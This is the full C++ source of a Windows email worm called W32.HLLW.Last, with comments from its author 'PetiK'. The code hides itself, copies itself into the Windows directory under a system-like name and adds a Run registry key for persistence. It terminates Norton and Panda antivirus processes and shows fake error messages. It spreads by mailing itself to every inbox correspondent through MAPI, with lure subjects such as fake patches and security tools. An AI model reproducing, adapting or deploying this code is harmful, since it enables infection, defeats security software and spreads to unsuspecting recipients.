   /*
   Name of worm : W32.HLLW.Last
   Author : PetiK
   Size : 28672 byte
   Comment : My very first (and last) worm coded in C++ (compiled with Borland).

   Why this name ? I decided to stop to code worms and virus. During one year I
   learnt many things about worms and virii and I thanks all poeple who helped
   me.


   */


   #include <stdio.h>
   #include <windows.h>
   #include <mapi.h>
   #include <tlhelp32.h>
   #pragma argsused//ne pas générer de fichier listing de compilation

   char filename[100];
   char windir[100], windr[100];
   HKEY hReg;
   FILE *htm;
   HANDLE infhtm,lSnapshot,myproc;
   HWND NAVh;
   BOOL rProcessFound;
   LPSTR Run = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";

   LHANDLE session;
   MapiMessage *mess;
   HINSTANCE hMAPI;
   char messId[512],mname[50],maddr[30];
   unsigned long count=0;

   BYTE done[50];
   DWORD siz=sizeof(done);
   DWORD type=REG_SZ;
   LPSTR Persona=".DEFAULT\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders";

   SYSTEMTIME syst;
   PROCESSENTRY32 uProcess;
   WIN32_FIND_DATA ffile;

   char *sujet[]={
   "New Game for You.",
   "Protect your computer against VBS/Worm and VBS/Virus",
   "Free Flash Application !",
   "Internet Explorer 5.0/6.0 Patch",
   "Try WinXP.",
   "Free Chat",
   };

   char *corps[]={
   "Hi,\n\nTake a look at this new game found on the web.",
   "This tool allows you to protect your computer against the VBS worm/virus.",
   "Hi,\n\nVery good application make with Flash 5.",
   "There is the last patch for Internet Explorer against the ActiveX's bugs.",
   "Run this small program to see a demo of Win XP.",
   "Hello,\n\nVery cool program to chat on the net.",
   };

   char *attachfile[]={
   "New_Game.exe",
   "Fix_VBSWormVirus.exe",
   "Flash_EXE.exe",
   "IEPatch.exe",
   "Demo_WinXP.exe",
   "FreeChat.exe",
   };

   char *text[]={
   "This file is not a Win32 file valid",
   "Cannot Open files : It does not appear to be a valid Win32\n\nIf you downloaded the file, try downloading again.",
   "Error with Kernel32 :\nThis program will be terminated.",
   "Loader Error :\nThis program will be terminated."
   };

   void Welcome();
   void FuckAntivirus();
   void htmfile();
   void Spread();

   ULONG (PASCAL FAR *RegSerPro)(ULONG, ULONG);
   ULONG (PASCAL FAR *mSendMail)(ULONG, ULONG, MapiMessage*, FLAGS, ULONG);
   ULONG (PASCAL FAR *mLogoff)(LHANDLE, ULONG, FLAGS, ULONG);
   ULONG (PASCAL FAR *mLogon)(ULONG, LPTSTR, LPTSTR, FLAGS, ULONG, LPLHANDLE);
   ULONG (PASCAL FAR *mFindNext)(LHANDLE, ULONG, LPTSTR, LPTSTR, FLAGS, ULONG, LPTSTR);
   ULONG (PASCAL FAR *mReadMail)(LHANDLE, ULONG, LPTSTR, FLAGS, ULONG, lpMapiMessage FAR *);
   ULONG (PASCAL FAR *mFreeBuffer)(LPVOID);

   WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow)

   {
   HMODULE k32=GetModuleHandle("KERNEL32.DLL");
   if(k32) {
       (FARPROC &)RegSerPro=GetProcAddress(k32,"RegisterServiceProcess");
       if(RegSerPro)
       RegSerPro(NULL,1);
       }

   GetModuleFileName(hInst,filename,100);
   GetWindowsDirectory((char *)windir,100);
   strcpy(windr,windir);
   strcat(windir,"\\MSKERN32.EXE");
   if ((lstrcmp(filename,windir))!=0) {
   Welcome();
   }
   strcat(windr,"\\MSKern32.exe");
   CopyFile(filename,windr,0);


   RegOpenKeyEx(HKEY_LOCAL_MACHINE,Run,0,KEY_WRITE,&hReg);
   RegSetValueEx(hReg,"MS Kernel32",0,REG_SZ, (BYTE *)windr, 100);
   RegCloseKey(hReg);

   FuckAntivirus();

   GetSystemTime(&syst);
   if(syst.wDay==1 && syst.wMonth==12) {
   CreateDirectory("C:\\PetiK_Dir",0);
   SetCurrentDirectory("C:\\PetiK_Dir");
   htm = fopen("petikvx.htm","w");
   fprintf(htm,"<html><head><title>The Last From PetiK</title></head>\n");
   fprintf(htm,"<body bgcolor=\"blue\" text=\"yellow\">\n");
   fprintf(htm,"<p align=\"center\"><font size=\"5\">Win32.HLLW.Last is in your computer\n");
   fprintf(htm,"<p align=\"center\"><font size=\"5\">This my last worm\n");
   fprintf(htm,"<p align=\"center\"><font size=\"3\">Greetz to : all3gro, Benny, Bumblebee, ");
   fprintf(htm,"Mandragore, ZeMacroKiller98, the 29A group and the [MATRiX] group.\n");
   fprintf(htm,"<p align=\"center\"><font size=\"5\">GOOD BYE\n");
   fprintf(htm,"</font></p>\n");
   fprintf(htm,"</body></html>");
   fclose(htm);
   ShellExecute(0,"open","petikvx.htm",0,0,SW_SHOWNORMAL);
   Sleep(3000);
   MessageBox(NULL,"My last worm.\nCoded by PetiK (c)2001","W32.HLLW.Last", MB_OK|MB_ICONINFORMATION);
   }

   htmfile();

   Sleep(30000);

   Spread();

   return 0;
   }


   void Welcome()
   {
   MessageBeep(MB_ICONHAND);
   MessageBox(NULL, text[GetTickCount()&3], filename, MB_OK|MB_ICONSTOP|MB_SYSTEMMODAL);
   }

   void FuckAntivirus()
   {
   register BOOL term;
   lSnapshot=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
   uProcess.dwSize=sizeof(uProcess);
   rProcessFound=Process32First(lSnapshot,&uProcess);
   while(rProcessFound) {
       if(strstr(uProcess.szExeFile,"NAVAPW32.EXE")!=NULL) {   // Norton Antivirus
           myproc=OpenProcess(PROCESS_ALL_ACCESS,FALSE,uProcess.th32ProcessID);
           if(myproc!=NULL) {
               term=TerminateProcess(myproc,0);
           }
           CloseHandle(myproc);
       }
       if(strstr(uProcess.szExeFile,"PAVSCHED.EXE")!=NULL) {   // Panda Antivirus
           myproc=OpenProcess(PROCESS_ALL_ACCESS,FALSE,uProcess.th32ProcessID);
           if(myproc!=NULL) {
               term=TerminateProcess(myproc,0);
           }
           CloseHandle(myproc);
       }
       rProcessFound=Process32Next(lSnapshot,&uProcess);
   }
   CloseHandle(lSnapshot);
   }


   void htmfile()
   {
   register bool abc=TRUE;
   register HANDLE hFile;
   register HWND verif;
   RegOpenKeyEx(HKEY_USERS,Persona,0,KEY_QUERY_VALUE,&hReg);
   RegQueryValueEx(hReg,"Personal",0,&type,done,&siz);
   RegCloseKey(hReg);
   SetCurrentDirectory(done);
   hFile=FindFirstFile("*.ht*",&ffile);
   if(hFile!=INVALID_HANDLE_VALUE) {
       while(abc) {
       WritePrivateProfileString("HTM,HTML Files",ffile.cFileName,"Found by W32.HLLW.Last","C:\\liste.txt");
       abc=FindNextFile(hFile,&ffile);
       }
   }
   FindClose(hFile);
   abc=TRUE;
   hFile=FindFirstFile("*.doc",&ffile);
   if(hFile!=INVALID_HANDLE_VALUE) {
       while(abc) {
       WritePrivateProfileString("DOC Files",ffile.cFileName,"Found by W32.HLLW.Last","C:\\liste.txt");
       abc=FindNextFile(hFile,&ffile);
       }
   }
   SetFileAttributes("C:\\liste.txt",FILE_ATTRIBUTE_ARCHIVE|FILE_ATTRIBUTE_HIDDEN);
   }

   void Spread()
   {
   hMAPI=LoadLibrary("MAPI32.DLL");
   (FARPROC &)mLogon=GetProcAddress(hMAPI, "MAPILogon");
   (FARPROC &)mLogoff=GetProcAddress(hMAPI, "MAPILogoff");
   (FARPROC &)mFindNext=GetProcAddress(hMAPI, "MAPIFindNext");
   (FARPROC &)mReadMail=GetProcAddress(hMAPI, "MAPIReadMail");
   (FARPROC &)mSendMail=GetProcAddress(hMAPI, "MAPISendMail");
   (FARPROC &)mFreeBuffer=GetProcAddress(hMAPI, "MAPIFreeBuffer");
   mLogon(NULL,NULL,NULL,MAPI_NEW_SESSION,NULL,&session);
   if(mFindNext(session,0,NULL,NULL,MAPI_LONG_MSGID,NULL,messId)==SUCCESS_SUCCESS) {
     do {
        if(mReadMail(session,NULL,messId,MAPI_ENVELOPE_ONLY|MAPI_PEEK,NULL,&mess)==SUCCESS_SUCCESS) {
   count=(unsigned long)(syst.wMilliseconds*syst.wMinute);
   while(count>5)
   count=(unsigned long)(count/2);
       strcpy(mname,mess->lpOriginator->lpszName);
       strcpy(maddr,mess->lpOriginator->lpszAddress);
       mess->ulReserved=0;
       mess->lpszSubject=sujet[count];
       mess->lpszNoteText=corps[count];
       mess->lpszMessageType=NULL;
       mess->lpszDateReceived=NULL;
       mess->lpszConversationID=NULL;
       mess->flFlags=MAPI_SENT;
       mess->lpOriginator->ulReserved=0;
       mess->lpOriginator->ulRecipClass=MAPI_ORIG;
       mess->lpOriginator->lpszName=mess->lpRecips->lpszName;
       mess->lpOriginator->lpszAddress=mess->lpRecips->lpszAddress;
       mess->nRecipCount=1;
       mess->lpRecips->ulReserved=0;
       mess->lpRecips->ulRecipClass=MAPI_TO;
       mess->lpRecips->lpszName=mname;
       mess->lpRecips->lpszAddress=maddr;
       mess->nFileCount=1;
       mess->lpFiles=(MapiFileDesc *)malloc(sizeof(MapiFileDesc));
       memset(mess->lpFiles, 0, sizeof(MapiFileDesc));
       mess->lpFiles->ulReserved=0;
       mess->lpFiles->flFlags=NULL;
       mess->lpFiles->nPosition=-1;
       mess->lpFiles->lpszPathName=filename;
       mess->lpFiles->lpszFileName=attachfile[count];
       mess->lpFiles->lpFileType=NULL;
       mSendMail(session, NULL, mess, NULL, NULL);
       count++;
       }
     }while(mFindNext(session,0,NULL,messId,MAPI_LONG_MSGID,NULL,messId)==SUCCESS_SUCCESS);
   free(mess->lpFiles);
   mFreeBuffer(mess);
   mLogoff(session,0,0,0);
   FreeLibrary(hMAPI);
   }
   }
